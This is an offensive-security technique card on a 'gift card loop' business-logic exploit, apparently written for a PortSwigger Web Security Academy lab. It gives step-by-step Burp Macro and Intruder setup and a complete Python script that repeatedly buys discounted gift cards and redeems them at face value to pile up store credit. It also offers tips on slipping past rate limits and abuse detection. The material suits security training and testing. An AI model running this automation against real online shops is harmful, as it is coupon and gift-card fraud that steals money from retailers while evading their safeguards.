# Gift Card Loop (Coupon × Gift-Card Profit Cycle)

## When this applies

- Application sells gift cards and accepts a discount coupon on the gift-card purchase.
- The gift card redeems for its FACE VALUE (not the discounted purchase price).
- Coupon is reusable (or can be re-applied via stacking — see `coupon-stacking.md`).

## Technique

Buy a $10 gift card with a 30% off coupon → spend $7 → redeem the gift card for $10 of store credit → net $3 profit per cycle. Automate with Burp Macros.

## Steps

### Manual proof of concept

```plaintext
1. Subscribe to newsletter → Get coupon SIGNUP30
2. Buy $10 gift card with coupon ($7 spent)
3. Extract gift card code from confirmation
4. Redeem gift card ($10 gained)
5. Net profit: $3
```

### Burp Macro setup — 30 minutes

```plaintext
Step 1: Manual Execution (Proof of Concept)
1. Subscribe to newsletter → Get coupon SIGNUP30
2. Buy $10 gift card with coupon ($7 spent)
3. Extract gift card code from confirmation
4. Redeem gift card ($10 gained)
5. Net profit: $3

Step 2: Burp Macro Setup
Settings → Sessions → Session Handling Rules
Click: Add
Rule description: "Gift Card Loop"
Scope: Include all URLs

Step 3: Define Macro
Details tab → Add → Run a macro
Click: Add (under Macros)
Macro description: "Buy and Redeem Gift Card"

Step 4: Select Macro Requests
Select these 5 requests from HTTP history:
1. POST /cart (Add gift card)
2. POST /cart/coupon (Apply SIGNUP30)
3. POST /cart/checkout (Complete purchase)
4. GET /cart/order-confirmation (Confirmation page)
5. POST /gift-card (Redeem gift card)

Click: OK

Step 5: Configure Parameter Extraction
Select: Request 4 (order confirmation)
Click: Configure item
Add: Custom parameter location in response
  ├─ Parameter name: gift-card
  ├─ Regex: <input[^>]*id="gift-card"[^>]*value="([^"]+)"
  └─ Extract from: Response body

Step 6: Link Extracted Parameter
Select: Request 5 (redeem gift card)
Click: Configure item
Find parameter: gift-card=ABC123XYZ789
Configure: Use extracted value from Request 4
  └─ Derive from: Request 4
      Parameter: gift-card

Step 7: Test Macro
Click: Test macro
Verify: All 5 requests complete successfully
Check: Account balance increased by $3
If success: Proceed to automation

Step 8: Intruder Automation
Create simple request: GET /
Send to Intruder
Payloads:
  ├─ Type: Null payloads
  ├─ Count: 450 (for $1,350 profit)
Resource Pool:
  └─ Max concurrent: 1

Step 9: Execute Full Attack
Click: Start attack
Monitor: Account balance periodically
Stop: When balance > jacket price ($1,337)
Purchase: Expensive item

Step 10: Verification
Navigate to "My account"
Verify: Sufficient store credit
Buy: Lightweight l33t leather jacket
```

**Macro Flow:**
```plaintext
[Intruder Request]
       ↓ (triggers)
[Session Handling Rule]
       ↓ (executes)
[Macro: 5-step sequence]
  1. Add gift card to cart
  2. Apply 30% discount coupon
  3. Checkout and pay $7
  4. Extract gift card code ←─ [EXTRACTION]
  5. Redeem code for $10  ←─ [USES EXTRACTED VALUE]
       ↓ (result)
[Net profit: +$3]
```

### Python automation

```python
#!/usr/bin/env python3
import requests
import re
import time

class GiftCardExploit:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.login()

    def login(self):
        url = f"{self.base_url}/login"
        data = {
            "username": self.username,
            "password": self.password
        }
        response = self.session.post(url, data=data)
        if "My account" in response.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed")

    def get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'name="csrf" value="([^"]+)"', response.text)
        return match.group(1) if match else None

    def add_gift_card_to_cart(self, product_id=2):
        url = f"{self.base_url}/cart"
        data = {
            "productId": product_id,
            "redir": "PRODUCT",
            "quantity": 1
        }
        response = self.session.post(url, data=data)
        return response.status_code == 200

    def apply_coupon(self, coupon="SIGNUP30"):
        url = f"{self.base_url}/cart/coupon"
        data = {
            "csrf": self.get_csrf_token(),
            "coupon": coupon
        }
        response = self.session.post(url, data=data)
        return "applied" in response.text.lower()

    def checkout(self):
        url = f"{self.base_url}/cart/checkout"
        data = {"csrf": self.get_csrf_token()}
        response = self.session.post(url, data=data)
        return response

    def extract_gift_card_code(self, html):
        match = re.search(r'id="gift-card"[^>]*value="([^"]+)"', html)
        return match.group(1) if match else None

    def redeem_gift_card(self, code):
        url = f"{self.base_url}/gift-card"
        data = {
            "csrf": self.get_csrf_token(),
            "gift-card": code
        }
        response = self.session.post(url, data=data)
        return "redeemed" in response.text.lower() or response.status_code == 200

    def get_store_credit(self):
        response = self.session.get(f"{self.base_url}/my-account")
        match = re.search(r'Store credit:\s*\$([0-9,]+\.[0-9]{2})', response.text)
        if match:
            return float(match.group(1).replace(',', ''))
        return None

    def execute_loop(self, target_credit=1400):
        initial_credit = self.get_store_credit()
        print(f"[*] Initial store credit: ${initial_credit}")
        print(f"[*] Target credit: ${target_credit}")

        cycles = 0
        while True:
            current_credit = self.get_store_credit()
            if current_credit >= target_credit:
                print(f"\n[+] Target reached! Final credit: ${current_credit}")
                break

            cycles += 1
            print(f"\n[*] Cycle {cycles} - Current credit: ${current_credit}")

            print("  [*] Adding gift card to cart...")
            if not self.add_gift_card_to_cart():
                print("  [-] Failed to add gift card")
                continue

            print("  [*] Applying discount coupon...")
            if not self.apply_coupon():
                print("  [-] Failed to apply coupon")
                continue

            print("  [*] Checking out...")
            checkout_response = self.checkout()

            print("  [*] Extracting gift card code...")
            gift_card_code = self.extract_gift_card_code(checkout_response.text)
            if not gift_card_code:
                print("  [-] Failed to extract gift card code")
                continue
            print(f"  [+] Got code: {gift_card_code}")

            print("  [*] Redeeming gift card...")
            if not self.redeem_gift_card(gift_card_code):
                print("  [-] Failed to redeem gift card")
                continue

            print(f"  [+] Cycle complete! Profit: $3")

            time.sleep(0.5)

        print(f"\n[+] Exploit complete! Executed {cycles} cycles.")
        print(f"[+] Total profit: ${current_credit - initial_credit}")

exploit = GiftCardExploit(
    base_url="https://lab-id.web-security-academy.net",
    username="wiener",
    password="peter"
)
exploit.execute_loop(target_credit=1400)
```

## Verifying success

- Store credit increases by the per-cycle profit each iteration.
- Gift card redemption completes without errors after each purchase.
- Final credit balance is sufficient for the target purchase.

## Common pitfalls

- Some apps mark coupons as one-time-per-account — combine with `coupon-stacking.md` to chain.
- CSRF tokens may rotate per request — extract a fresh token before each step.
- Race detection / abuse-prevention may rate-limit — keep `concurrent=1` and add small delays.

## Tools

- Burp Suite Macro
- Burp Suite Intruder
- Python `requests`
- Burp Suite Session Handling Rules
